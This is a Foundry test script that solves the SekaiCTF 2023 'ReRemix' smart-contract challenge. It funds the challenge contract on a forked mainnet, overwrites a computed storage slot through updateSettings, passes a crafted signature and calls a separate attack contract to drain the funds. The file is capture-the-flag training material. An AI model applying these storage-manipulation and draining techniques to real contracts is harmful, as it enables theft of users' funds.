// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/SekaiCTF_2023/ReRemix/MusicRemixer.sol";
import "src/SekaiCTF_2023/ReRemix/ReRemixAttack.sol";


contract Exploiter is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    MusicRemixer remixer;

    function setUp() public {
        vm.createSelectFork("mainnet");
        
        vm.deal(deployer, 100 ether);
        vm.startPrank(deployer, deployer);

        remixer = new MusicRemixer{value: 100 ether}();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        vm.deal(attacker, 1 ether);
        solve();

        vm.stopPrank();

    }

    function solve() public {
        // change tempo
        SampleEditor editor = remixer.sampleEditor();
        editor.setTempo(233);
        console2.log("Project Tempo: %d", editor.project_tempo());

        bytes32 region = keccak256(abi.encodePacked("Rhythmic", uint256(2)));
        bytes32 regionStart = keccak256(abi.encodePacked(region));
        // console2.logBytes32(vm.load(address(editor), bytes32(uint256(regionStart)+4)));
        uint256 value = 0x0101;
        editor.updateSettings(uint256(regionStart)+4, value);
        editor.adjust();
        console2.log("Tempo: %d", editor.region_tempo());

        // get initial fund
        bytes memory signature = hex"1337c0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0de13379337c0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0dec0de1337";
        // remixer.getMaterial(signature);

        MusicRemixerAttack ra = new MusicRemixerAttack();
        ra.setUp{value: 1 ether}(address(remixer), signature);
        ra.attack();
    }

}


